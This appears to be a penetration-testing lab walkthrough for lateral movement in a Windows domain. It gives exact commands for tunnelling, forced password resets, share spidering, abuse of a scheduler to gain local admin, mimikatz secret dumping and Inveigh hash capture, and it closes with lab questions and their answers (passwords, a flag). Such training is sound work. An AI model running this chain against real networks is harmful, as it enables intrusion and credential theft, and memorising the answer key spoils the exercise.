# Lateral Movement
## Full Path Escalate
### 1. hporter → ssmalls
Creds `hporter:Gr8hambino!` from LSA secrets on DEV01. BloodHound shows `ForceChangePassword` over `ssmalls`.

```
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force) -Verbose
```

### 2. ssmalls → backupadm
Spider the `Department Shares` as ssmalls:

```
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
```

Pull `IT/Private/Development/SQL Express Backup.ps1` — hardcoded `backupadm` credentials.

```
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
```

### 3. backupadm → ilfserveradm (MS01)
```
proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

Read `C:\panther\unattend.xml` → `ilfserveradm:Sys26Admin` (Remote Desktop Users, not admin).

### 4. ilfserveradm → local admin (SysaxAutomation)
RDP in as ilfserveradm. Create `C:\Users\ilfserveradm\Documents\pwn.bat`:

```
net localgroup administrators ilfserveradm /add
```

Then:
1. Run `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
2. **Setup Scheduled/Triggered Tasks** → **Add task (Triggered)**
3. Monitor folder: `C:\Users\ilfserveradm\Documents`
4. Check **Run task if a file is added to the monitor folder or subfolder(s)**
5. **Run any other Program** → `C:\Users\ilfserveradm\Documents\pwn.bat`
6. Uncheck **Login as the following user to run task** (service runs as SYSTEM)
7. **Finish** → **Save**
8. Drop a new `.txt` in the monitored folder to trigger

Verify with `net localgroup administrators`.

### 5. Local admin → mssqladm
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

Yields `DefaultPassword: DBAilfreight1!`. Get the matching username:

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

→ `mssqladm:DBAilfreight1!`


## Questions
Follow the steps above to escalate to administrator, then proceed with the accomplishing the requirements below:
1. Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer. **Answer: !qazXSW@**
2. Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer. **Answer: lucky7**
3. Escalate privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop. **Answer: 33a9d46de4015e7b3b0ad592a9394720**
4. Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer. **Answer: 1squints2**
   - Use Inveigh to capture the NTLMv2 hash:
        ```powershell
        PS C:\Users\Public\> Import-Module .\Inveigh.ps1
        PS C:\Users\Public\> Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y -ConsoleOutput Y -FileOutput Y 
        ```